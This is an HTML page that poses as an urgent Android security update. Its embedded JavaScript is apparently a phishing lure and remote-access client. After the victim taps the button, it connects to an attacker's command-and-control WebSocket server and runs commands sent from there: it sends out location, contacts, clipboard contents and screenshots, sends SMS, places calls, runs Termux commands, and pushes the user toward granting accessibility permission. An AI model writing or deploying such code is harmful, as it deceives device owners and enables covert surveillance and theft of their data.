<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>System Update Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
        }
        h1 {
            color: #ff6b6b;
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
        }
        p {
            color: #ddd;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .update-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff6b6b, #ee5a5a);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        .update-btn:active {
            transform: scale(0.98);
        }
        .status {
            margin-top: 20px;
            text-align: center;
            color: #4ecdc4;
            font-size: 14px;
            display: none;
        }
        .permission-box {
            margin-top: 20px;
            padding: 15px;
            background: rgba(0,0,0,0.5);
            border-radius: 10px;
            display: none;
        }
        .permission-box p {
            margin-bottom: 10px;
            font-size: 14px;
            color: #ffd93d;
        }
        .grant-btn {
            background: #4ecdc4;
            padding: 10px;
            border: none;
            border-radius: 8px;
            color: #1a1a2e;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ Critical System Update</h1>
        <p>Your Android device requires an immediate security patch. Click below to install the latest protection.</p>
        <button class="update-btn" id="updateBtn">📲 Install Update Now</button>
        <div class="status" id="status">✓ Connecting to update server...</div>
        <div class="permission-box" id="permissionBox">
            <p>🔐 Accessibility permission required for installation</p>
            <button class="grant-btn" id="grantBtn">Allow Accessibility Access</button>
        </div>
    </div>

    <script>
        let ws = null;
        let serverUrl = "wss://your-server.com:8080"; // GANTI DENGAN IP/DOMAIN SERVER ANDA
        let deviceId = generateDeviceId();
        
        function generateDeviceId() {
            return 'dev_' + Math.random().toString(36).substr(2, 9);
        }
        
        function connectWebSocket() {
            ws = new WebSocket(serverUrl);
            
            ws.onopen = function() {
                console.log("[+] Connected to C2 server");
                document.getElementById('status').style.display = 'block';
                document.getElementById('status').innerHTML = '✓ Connected • Device ID: ' + deviceId;
                ws.send(JSON.stringify({
                    type: 'register',
                    deviceId: deviceId,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                }));
            };
            
            ws.onmessage = function(event) {
                let data = JSON.parse(event.data);
                console.log("[*] Command received:", data);
                
                if (data.type === 'command') {
                    executeCommand(data.command, data.params);
                } else if (data.type === 'request_permission') {
                    document.getElementById('permissionBox').style.display = 'block';
                }
            };
            
            ws.onclose = function() {
                console.log("[-] Disconnected, reconnecting in 5s...");
                setTimeout(connectWebSocket, 5000);
            };
        }
        
        function executeCommand(cmd, params) {
            switch(cmd) {
                case 'screenshot':
                    captureScreen();
                    break;
                case 'get_location':
                    getLocation();
                    break;
                case 'get_contacts':
                    getContacts();
                    break;
                case 'get_sms':
                    getSMS();
                    break;
                case 'send_sms':
                    if(params && params.number && params.message) {
                        sendSMS(params.number, params.message);
                    }
                    break;
                case 'make_call':
                    if(params && params.number) {
                        makeCall(params.number);
                    }
                    break;
                case 'open_url':
                    if(params && params.url) {
                        window.open(params.url, '_blank');
                    }
                    break;
                case 'show_notification':
                    if(params && params.text) {
                        showNotification(params.text);
                    }
                    break;
                case 'clipboard':
                    getClipboard();
                    break;
                case 'browser_history':
                    getBrowserHistory();
                    break;
                case 'execute_termux':
                    if(params && params.command) {
                        executeTermuxCommand(params.command);
                    }
                    break;
                default:
                    console.log("Unknown command:", cmd);
            }
        }
        
        function captureScreen() {
            // Screenshot via canvas (limited, but works)
            html2canvas(document.body).then(canvas => {
                let imgData = canvas.toDataURL('image/png');
                ws.send(JSON.stringify({
                    type: 'result',
                    deviceId: deviceId,
                    command: 'screenshot',
                    data: imgData
                }));
            }).catch(err => {
                ws.send(JSON.stringify({
                    type: 'error',
                    deviceId: deviceId,
                    error: err.toString()
                }));
            });
        }
        
        function getLocation() {
            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    ws.send(JSON.stringify({
                        type: 'result',
                        deviceId: deviceId,
                        command: 'location',
                        data: {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        }
                    }));
                }, err => {
                    ws.send(JSON.stringify({
                        type: 'error',
                        deviceId: deviceId,
                        error: err.message
                    }));
                });
            } else {
                ws.send(JSON.stringify({
                    type: 'error',
                    deviceId: deviceId,
                    error: 'Geolocation not supported'
                }));
            }
        }
        
        function getContacts() {
            // Web contacts API (requires permission)
            if(navigator.contacts && navigator.contacts.select) {
                navigator.contacts.select(['name', 'tel'], {multiple: true})
                    .then(contacts => {
                        ws.send(JSON.stringify({
                            type: 'result',
                            deviceId: deviceId,
                            command: 'contacts',
                            data: contacts
                        }));
                    })
                    .catch(err => {
                        ws.send(JSON.stringify({
                            type: 'error',
                            deviceId: deviceId,
                            error: err.message
                        }));
                    });
            } else {
                ws.send(JSON.stringify({
                    type: 'error',
                    deviceId: deviceId,
                    error: 'Contacts API not available'
                }));
            }
        }
        
        function getSMS() {
            // SMS retrieval requires Android SMS Retriever API or Accessibility
            ws.send(JSON.stringify({
                type: 'result',
                deviceId: deviceId,
                command: 'sms',
                data: {status: 'requires_accessibility', message: 'Grant accessibility to enable SMS reading'}
            }));
        }
        
        function sendSMS(number, message) {
            // SMS sending via tel: intent
            window.location.href = `sms:${number}?body=${encodeURIComponent(message)}`;
            ws.send(JSON.stringify({
                type: 'result',
                deviceId: deviceId,
                command: 'send_sms',
                data: {status: 'initiated', number: number}
            }));
        }
        
        function makeCall(number) {
            window.location.href = `tel:${number}`;
        }
        
        function showNotification(text) {
            if(Notification.permission === 'granted') {
                new Notification('System Update', {body: text});
            } else if(Notification.permission !== 'denied') {
                Notification.requestPermission().then(perm => {
                    if(perm === 'granted') {
                        new Notification('System Update', {body: text});
                    }
                });
            }
        }
        
        function getClipboard() {
            navigator.clipboard.readText().then(text => {
                ws.send(JSON.stringify({
                    type: 'result',
                    deviceId: deviceId,
                    command: 'clipboard',
                    data: text
                }));
            }).catch(err => {
                ws.send(JSON.stringify({
                    type: 'error',
                    deviceId: deviceId,
                    error: err.message
                }));
            });
        }
        
        function getBrowserHistory() {
            // Limited history access
            let historyLength = window.history.length;
            ws.send(JSON.stringify({
                type: 'result',
                deviceId: deviceId,
                command: 'browser_history',
                data: {length: historyLength, note: 'Full history requires browser extension'}
            }));
        }
        
        function executeTermuxCommand(cmd) {
            // This requires Termux:API installed
            // Generate intent URL for Termux
            let termuxIntent = `intent:#Intent;action=com.termux.api.ExecuteCommand;S.command=${encodeURIComponent(cmd)};end`;
            window.location.href = termuxIntent;
            ws.send(JSON.stringify({
                type: 'result',
                deviceId: deviceId,
                command: 'termux',
                data: {status: 'command_sent', command: cmd}
            }));
        }
        
        // Setup button
        document.getElementById('updateBtn').addEventListener('click', function() {
            this.style.display = 'none';
            connectWebSocket();
            
            // Request notification permission
            if(Notification.permission !== 'granted' && Notification.permission !== 'denied') {
                Notification.requestPermission();
            }
        });
        
        document.getElementById('grantBtn').addEventListener('click', function() {
            // Redirect to accessibility settings
            window.location.href = 'intent:#Intent;action=android.settings.ACCESSIBILITY_SETTINGS;end';
            ws.send(JSON.stringify({
                type: 'result',
                deviceId: deviceId,
                command: 'accessibility_granted',
                data: {status: 'user_redirected_to_settings'}
            }));
        });
        
        // Load html2canvas for screenshots
        let script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        document.head.appendChild(script);
    </script>
</body>
</html>
